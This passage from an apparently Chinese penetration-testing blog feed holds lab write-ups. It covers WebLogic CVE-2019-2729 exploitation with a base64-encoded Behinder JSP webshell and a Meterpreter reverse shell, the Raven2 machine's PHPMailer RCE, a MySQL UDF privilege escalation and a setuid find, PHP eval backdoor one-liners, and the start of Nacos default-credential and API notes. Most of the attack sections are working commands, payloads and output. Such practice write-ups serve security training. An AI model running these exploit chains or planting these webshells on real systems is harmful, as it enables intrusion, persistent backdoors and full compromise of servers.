class="line">[+]CVE-2019-2729 漏洞存在</span><br><span class="line">[*]开始检测 CVE201710271</span><br><span class="line">[-]Target weblogic not detected CVE-2017-10271</span><br><span class="line">[*]开始检测 CVE20173506</span><br><span class="line">[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506</span><br><span class="line">[+]CVE-2017-3506 漏洞存在</span><br></pre></td></tr></table></figure><ul><li><p>CVE-2019-2729 漏洞存在，这个是反序列化漏洞，可以执行RCE</p></li><li><p>CVE-2017-3506 漏洞存在，这个是wls-wsat组件远程命令执行，与2017-10271类似</p></li></ul><h2 id="利用cve-2019-2729"><a class="markdownIt-Anchor" href="#利用cve-2019-2729"></a> 利用CVE-2019-2729</h2><p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~/Mywork/Tools/WeblogicScan/CVE-2019-2729-Exploit]</span><br><span class="line">└─$ python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c chdir</span><br><span class="line">[+] Send Request to : http://10.131.210.32:7001//wls-wsat/CoordinatorPortType</span><br><span class="line">[+] Response : C:\Oracle\Middleware\user_projects\domains\base_domain</span><br></pre></td></tr></table></figure><p>尝试写一个木马进去，或者反弹shell也行。尝试反弹shell不可行，放弃。写一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br></pre></td></tr></table></figure><p>看一下这个weblogic的目录结构，以及把文件放在哪里。经过<code>dir</code>和网上的类似资料，发现放在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war</span><br></pre></td></tr></table></figure><p>写进去，注意这里面<code>^</code>为转义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c &#x27;echo ^&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%^&gt; &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell.jsp&#x27;</span><br></pre></td></tr></table></figure><p>然而不行，呵呵呵呵</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705152442230.png" alt="image-20230705152442230" /></p><p>这个漏洞在<a href="http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp%E8%BF%99%E9%87%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E9%9D%A2%E7%9A%84operator%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%9A">http://10.131.210.32:7001/uddiexplorer/SearchPublicRegistries.jsp这里，这里面的operator我们可以利用：</a></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230705153152705.png" alt="image-20230705153152705" /></p><p>那么直接在msf上使用这个漏洞返回shell也不行，没返回session。尝试 base64 / hex 传一个冰蝎马吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBcmViZXlvbmQqL3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO0NpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoay5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7fSU+ &gt; .\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp&#x27;</span></span><br><span class="line"></span><br><span class="line">python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c <span class="string">&#x27;certutil -f -decode C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_b.jsp C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\5f6ebw\war\shell_be.jsp&#x27;</span></span><br></pre></td></tr></table></figure><p>管用！连上了。</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/image-20230706154311007.png" alt="image-20230706154311007" /></p><p>多种方式进行会话维持</p><h2 id="冰蝎meterpreter连"><a class="markdownIt-Anchor" href="#冰蝎meterpreter连"></a> 冰蝎meterpreter连</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload java/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; java/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.131.210.172</span><br><span class="line">lhost =&gt; 10.131.210.172</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4445</span><br><span class="line">lport =&gt; 4445</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.131.210.172:4445 </span><br><span class="line">[*] Sending stage (58829 bytes) to 10.131.210.32</span><br><span class="line">[*] Meterpreter session 3 opened (10.131.210.172:4445 -&gt; 10.131.210.32:49950) at 2023-07-06 16:08:07 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>好吧，找另外一个漏洞：</p><blockquote><p>检查Payload：Weblogic10 HttpEchoShell1<br />[+]存在：CVE_2017_10271_ECHO漏洞，返回信息：de1ay\administrator</p></blockquote><p>上传冰蝎马，然后上传msf的木马反弹shell，然后上线cs，冲！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础环境设置&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础环境设置&quot;&gt;&lt;/a&gt; 基础环境设置&lt;/h1&gt;
&lt;h2 id=&quot;主要练习&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#主要练习&quot;&gt;&lt;/a&gt; 主要</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>打靶-Raven2</title>
    <link href="https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/"/>
    <id>https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/</id>
    <published>2023-06-28T02:07:36.000Z</published>
    <updated>2023-06-28T02:07:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资产搜索信息搜集"><a class="markdownIt-Anchor" href="#资产搜索信息搜集"></a> 资产搜索&amp;信息搜集</h1><p>先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ sudo masscan 10.131.210.0/24 --ports 80</span><br><span class="line">[sudo] password for j3fffff: </span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-26 04:30:34 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [1 port/host]</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.39 这个才是</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.134 这个是Canon打印机     </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.9 H3Cwifi</span><br><span class="line">Discovered open port 80/tcp on 10.131.210.1                       </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.59              </span><br><span class="line">Discovered open port 80/tcp on 10.131.210.65 访问不了</span><br></pre></td></tr></table></figure><p>找到机器了，那么就访问网页，发现是这样的：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133330474.png" alt="image-20230628133330474" /></p><p>还是用nmap扫一下，是linux系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -A -p- 10.131.210.39 </span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)</span><br><span class="line">|   2048 315801194da280a6b90d40981c97aa53 (RSA)</span><br><span class="line">|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)</span><br><span class="line">|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-title: Raven Security</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          37669/udp6  status</span><br><span class="line">|   100024  1          44486/udp   status</span><br><span class="line">|   100024  1          51551/tcp   status</span><br><span class="line">|_  100024  1          52741/tcp6  status</span><br><span class="line">51551/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure><p>使用burp抓包，随便点一下，发现一些URL：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628133849371.png" alt="image-20230628133849371" /></p><p>不够，再用dirb扫一下，发现目录：<code>vendor</code></p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134010281.png" alt="image-20230628134010281" /></p><p>分别打开，<code>PATH</code>，内容有网站的目录以及一个flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure><p>再打开：<code>SECURITY、VERSION</code>，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">## Version 5.2.17 (December 9th 2016)</span><br><span class="line">* This is officially the last feature release of 5.2. Security fixes only from now on; use PHPMailer 6.0!</span><br><span class="line"></span><br><span class="line">PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com).</span><br></pre></td></tr></table></figure><p>发现phpmail漏洞，上面有wordpress，使用wpscan扫一下，发现了upload目录，其他的好像没啥用：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628134946810.png" alt="image-20230628134946810" /></p><h1 id="phpmail漏洞rce-getshell"><a class="markdownIt-Anchor" href="#phpmail漏洞rce-getshell"></a> PHPMAIL漏洞RCE-getshell</h1><p>去找存在Phpmail的页面，一般存在于mail联系等，所以就是contact.php了。</p><p>发现使用这个<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a>没办法成功，所以换一个exp：<a href="https://www.exploit-db.com/download/40974">40974.py</a></p><p>更改一些配置，例如攻击的页面等，然后执行脚本，访问contact.php，再访问shell.php</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628100744698.png" alt="image-20230628100744698" /></p><p>弄好了就直接打</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628135427514.png" alt="image-20230628135427514" /></p><p>访问一下<code>contact.php</code>，他就生成shell，在msf开个监听，然后打开<code>10.131.210.39/shell.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf6 post(multi/manage/shell_to_meterpreter) &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">...</span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br></pre></td></tr></table></figure><p>设置一下LHOST即可，可以自己设置payload，现在用不到，等着返回，就可以拿到了shell，然后引入meterpreter进行后渗透</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use post/multi/manage/shell_to_meterpreter</span><br><span class="line">session 1</span><br></pre></td></tr></table></figure><p>成功，可以进行后渗透</p><h1 id="渗透提权"><a class="markdownIt-Anchor" href="#渗透提权"></a> 渗透提权</h1><p>先进行信息搜集，<a href="http://xn--LinEnum-fw3kw4f.sh">上传LinEnum.sh</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter# upload LinuEnum.sh /var/www/html/LinuEnum.sh</span><br></pre></td></tr></table></figure><p>扫一下，将至重定向到一个文件，看文件，发现存在Mysql：<code>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3</code>，好了，应该可以用它来提权，得先知道他的用户名密码，所以一顿查找：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到了，在<code>/var/www/html/wordpress/wp-config.php</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);</span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br></pre></td></tr></table></figure><p>用msf链接数据库，使用UDF提权试试看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>下载UDF，编译一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure><p>操作！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure><p>全部都OK，后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070" /></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628125028105.png" alt="image-20230628125028105" /></p><p>全局找Flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># find / -name flag*</span><br><span class="line">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br><span class="line"># cat /root/flag4.txt</span><br></pre></td></tr></table></figure><h1 id="备注"><a class="markdownIt-Anchor" href="#备注"></a> 备注</h1><h2 id="命令行写shell出错"><a class="markdownIt-Anchor" href="#命令行写shell出错"></a> 命令行写shell出错</h2><p>他是反弹shell，所以开启：<code>nc -lvp 4444</code>，接受到了，尝试写一个一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br></pre></td></tr></table></figure><p>发现了一些错误：</p><p><img src="/images/%E6%89%93%E9%9D%B6-Raven2/image-20230628101840177.png" alt="image-20230628101840177" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;&lt;?php eval($_GET[&#x27;Jeff&#x27;]);?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval($_GET[Jeff]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_GET[\&#x27;Jeff\&#x27;]);?&gt;&#x27; &gt; bdoor.php     </span><br><span class="line">/bin/sh: 5: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php</span><br><span class="line">$ cat bdoor.php</span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php @eval($_POST[\&#x27;h4ck\&#x27;]) ?&gt;&#x27; &gt; bdoor.php</span><br><span class="line">/bin/sh: 7: Syntax error: &quot;)&quot; unexpected</span><br><span class="line">$ cat bdoor.php </span><br><span class="line">&lt;?php eval([&#x27;X&#x27;]);?&gt;</span><br><span class="line">$ echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line">$ cat 1.php</span><br><span class="line">&lt;?php eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure><p>需要转义</p><h2 id="小彩蛋"><a class="markdownIt-Anchor" href="#小彩蛋"></a> 小彩蛋</h2><p>发现里面有contact.zip，可以下下来，自己看看里面有啥，这也是思路</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;资产搜索信息搜集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#资产搜索信息搜集&quot;&gt;&lt;/a&gt; 资产搜索&amp;amp;信息搜集&lt;/h1&gt;
&lt;p&gt;先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了：&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="打靶" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="权限提升" scheme="https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="漏洞扫描" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>nacos复现</title>
    <link href="https://j3f5.github.io/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-06-26T12:22:04.000Z</published>
    <updated>2023-06-27T12:22:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a class="markdownIt-Anchor" href="#基本信息"></a> 基本信息</h1><p>使用的是在线靶场：<a href="https://hack.zkaq.cn/battle/target?id=1496966ab0f410bd">https://hack.zkaq.cn/battle/target?id=1496966ab0f410bd</a></p><p>这个靶场是2020的，漏洞差不多也是那个时候吧。根据大佬的提示，看能不能通过这个靶场练习一下：</p><ol><li>探测hessian版本、nacos版本</li><li>能否拉出依赖</li></ol><p>开始之前，还是得看一下官方文档。</p><h2 id="nacos"><a class="markdownIt-Anchor" href="#nacos"></a> Nacos</h2><p><code>Nacos /nɑ:kəʊs/ </code> 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><p>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。</p><p>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。 Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p><p>参考：<a href="https://nacos.io/zh-cn/docs/what-is-nacos.html">https://nacos.io/zh-cn/docs/what-is-nacos.html</a></p><h2 id="鉴权"><a class="markdownIt-Anchor" href="#鉴权"></a> <a href="https://nacos.io/zh-cn/docs/auth.html">鉴权</a></h2><p>总结有几点：</p><ol><li><p>非docker安装默认关闭鉴权，打开配置<code>application.properties</code>如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### If turn on auth system:</span><br><span class="line">nacos.core.auth.enabled=false</span><br><span class="line"></span><br><span class="line">### If turn on auth system:</span><br><span class="line">nacos.core.auth.system.type=nacos</span><br><span class="line">nacos.core.auth.enabled=true</span><br></pre></td></tr></table></figure></li><li><p>开启鉴权后，配置<code>application.properties</code>默认密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### The default token(Base64 String):</span><br><span class="line">nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure><p>自定义密钥时，推荐将配置项设置为<strong>Base64编码</strong>的字符串，<strong>注意</strong>：鉴权开关是修改之后立马生效的，不需要重启服务端。</p></li><li><p>鉴权采用JWT token，弱用户名密码：nacos/nacos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &#x27;127.0.0.1:8848/nacos/v1/auth/login&#x27; -d &#x27;username=nacos&amp;password=nacos&#x27;</span><br><span class="line"># Success！</span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyOTE2Nn0.2TogGhhr11_vLEjqKko1HJHUJEmsPuCxkur-CfNojDo&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br><span class="line"># 随后操作配置需要带上accessToken</span><br><span class="line">curl -X GET &#x27;127.0.0.1:8848/nacos/v1/cs/configs?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyMzkyM30.O-s2yWfDSUZ7Svd3Vs7jy9tsfDNHs1SuebJB4KlNY8Q&amp;dataId=nacos.example.1&amp;group=nacos_group&#x27;</span><br></pre></td></tr></table></figure></li></ol><h2 id="api调用"><a class="markdownIt-Anchor" href="#api调用"></a> <a href="https://nacos.io/zh-cn/docs/open-api.html">API调用</a></h2><ol><li><p>配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询配置历史版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/history?search=accurate&amp;dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure><p>至于详情/上一个版本的配置信息，则需要提供更多的信息</p></li><li><p>服务发现/实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 